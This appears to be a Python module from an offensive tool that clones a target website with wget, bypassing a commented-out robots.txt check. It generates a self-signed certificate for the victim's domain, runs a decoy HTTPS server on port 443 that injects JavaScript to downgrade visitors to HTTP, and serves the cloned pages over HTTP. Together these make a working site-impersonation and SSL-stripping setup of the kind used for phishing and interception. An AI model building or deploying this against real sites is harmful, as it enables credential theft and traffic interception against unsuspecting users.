import subprocess
import os
import requests
from urllib.robotparser import RobotFileParser
from urllib.parse import urlparse
from http.server import SimpleHTTPRequestHandler
from . import gen_selfsigned_cert
import http.server
import ssl
import socketserver
import signal
import time
import threading

# Can also try to use a browser redirect, will test what works best:
# def do_GET(self):
#     # Send HTTP Redirect Response (301 or 302)
#     self.send_response(301)  # Use 302 for temporary redirects
#     self.send_header("Location", "http://{domain}".format(domain=domain))
#     self.end_headers()


# Define the handler with JavaScript injection
class InjectRedirectHandler(SimpleHTTPRequestHandler):
  def do_GET(self):
    # Inject JavaScript to redirect from HTTPS to HTTP
    content = """
        <html>
        <head>
          <script type="text/javascript">
            if (window.location.protocol === "https:") {
              window.location.protocol = "http:";
            }
          </script>
        </head>
        <body>
          <h1>Redirecting...</h1>
          <p>If not redirected, please try <a href="http://{domain}">this link</a>.</p>
        </body>
        </html>
        """.format(domain=domain)  # JS inject on the local domain that we host, using global domain variable

    # Respond with the injected HTML content
    self.send_response(200)
    self.send_header("Content-type", "text/html")
    self.end_headers()
    self.wfile.write(content.encode("utf-8"))

## Define globals to be used
domain = ''
directory_name = ''
https_server = None
http_server = None


def cert_and_key_file_exist(cert_file="cert.pem", key_file="key.pem"):
  return os.path.exists(cert_file) and os.path.exists(key_file)

# Function to check robots.txt for scraping permission
# If I want to honor robots.txt I have to fix so it can be found from mainsite and if not
# handle that as well. Currently we are running into errors.
def can_scrape(in_url):
  robots_url = in_url.rstrip('/') + "/robots.txt"  # Ensure no double slashes
  rp = RobotFileParser()

  try:
    rp.set_url(robots_url)
    rp.read()  # Read the robots.txt file
    return rp.can_fetch('*', in_url)
  except (requests.exceptions.RequestException, ValueError) as e:
    # If robots.txt is missing or there is any error, assume scraping is allowed
    print(f"Error fetching {robots_url}: {e}")
    return True  # Default to allowing scraping if robots.txt is inaccessible or missing


# Main scraping function
def scrape_page(in_url, in_quick_clone="no"):
  # First, check if scraping is allowed
 # if not can_scrape(in_url):
  #  print(f"Scraping is not allowed by robots.txt on {in_url}")
   # set_override=input("Override? (Y/N)")
   # if not set_override.strip().lower() == 'y':
   #   return

  # Parse the URL and extract the netloc (domain)
  global domain
  global directory_name

  parsed_url = urlparse(in_url)
  domain = parsed_url.netloc

  directory_name = domain + 'Site'

  if not os.path.exists(directory_name):
    os.makedirs(directory_name)

  if in_quick_clone == "yes":
    subprocess.run(['wget', '--user-agent', 'Mozilla/5.0', '--recursive',
                                    '--no-parent', '-l1',
                                    in_url, '-P', directory_name])

  # Let us add a quicker cloning if in hurry on the network
  else:
    subprocess.run(['wget', '--user-agent', 'Mozilla/5.0', '--recursive',
                  '--limit-rate=50k', '--no-parent', '-l1', '--wait=2', '--random-wait',
                    in_url, '-P', directory_name])


def host_local_decoy_https_server(in_cert_file, in_key_file):
  global https_server
  server_address = ('', 443)
  https_server = http.server.HTTPServer(server_address, InjectRedirectHandler)

  # Create SSL context
  context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
  context.load_cert_chain(certfile=in_cert_file, keyfile=in_key_file)

  # Wrap server socket with the context
  https_server.socket = context.wrap_socket(https_server.socket, server_side=True)

  print("HTTPS server with JavaScript redirect running on port 443...")
  https_server.serve_forever()


def host_local_decoy_http_server(port=80):
  global http_server
  dotindex_path = os.path.join(directory_name, f'www.{domain}')
  os.chdir(dotindex_path)  # Change directory to the downloaded site
  http_server = socketserver.TCPServer(("", port), SimpleHTTPRequestHandler)

  print(f"Serving {dotindex_path} at http://localhost:{port}")
  http_server.serve_forever()


# Example usage
def main(in_url, in_port, in_quick_clone):
  # Oh boy ...
  scrape_page(in_url, in_quick_clone)
  signal.signal(signal.SIGINT, signal.SIG_IGN)
  port = in_port

  gen_selfsigned_cert.create_self_signed_cert(domain)
  while not cert_and_key_file_exist("cert.pem", "key.pem"):  ## Easy inwait of cert and key generate
    time.sleep(2)

  host_local_decoy_https_server("cert.pem", "key.pem")


if __name__ == '__main__':
  main(in_url="", in_port=80, in_quick_clone="no")